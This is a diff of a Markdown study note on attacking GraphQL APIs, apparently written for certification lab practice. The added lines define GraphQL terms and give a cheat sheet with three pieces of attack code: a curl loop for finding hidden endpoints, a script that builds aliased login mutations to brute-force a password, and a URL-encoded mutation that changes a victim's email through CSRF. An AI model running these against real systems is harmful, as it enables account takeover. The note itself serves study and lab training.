@@ -2,27 +2,55 @@
 
 ## Key Terms
 
-```bash
-- Introspection -> 
-- Mutations     -> 
+```
+- GraphQL       -> a query language for APIs that allows clients to request exactly the data they need and nothing more.
+
+- Introspection -> a special query that asks the GraphQL server for information about its own schema.
+
+- Mutations     -> operations that modify data (create, update, or delete).
+
+- Aliases       ->  allow sending multiple queries or mutations in a single request by giving each one a unique identifier.
 ```
 
 ## Walkthrough - Most Important Labs
 
 - [GraphQL API exposure private field](GraphQL-API-exposure-private-field.md)
-
-
-## Methodology
-
-```bash
-
-
-```
+- [GrapQL brute-force via grapql ALIASES (script aliases-generator)](grapql-bruteforce-via-aliases.md)
 
 ## Cheat Sheet
 
-```js
+> Finding a hidden GraphQL endpoint (use wordlist below)
+```bash
+while read -r i; do
+    if curl -s "https://<IP>/$i" | grep -qi "query"; then
+        echo "[MATCH]: $i"
+    fi
+done < x.txt
+# OUTPUT EXAMPLE:
+[MATCH]: api  
+# /api?query=
+```
 
+> Script to generate multiple aliases to attempt brute-force 
+```bash
+text='''
+alias_x: login(input: {username: "carlos", password: "BRUTE-FORCE"}) {\n
+\ttoken\n
+\tsuccess\n
+  }
+'''
+count=1
+cat pass-bscp.txt | while read i; do 
+  echo -e $text | sed "s/BRUTE-FORCE/$i/" | sed "s/alias_x/alias_$count/"
+ let count+=1
+done
+```
+
+> Login accept x-www-form?
+> CSRF -> change content-type to application/x-www-form-urlencoded -> modify the necessary parameters -> Engagement tools -> Generate CSRF -> send to victim
+> Adapt the body to url format:
+```bash
+    query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22foo%40foo.com%22%7D%7D
 ```
 
 ## Common endpoints
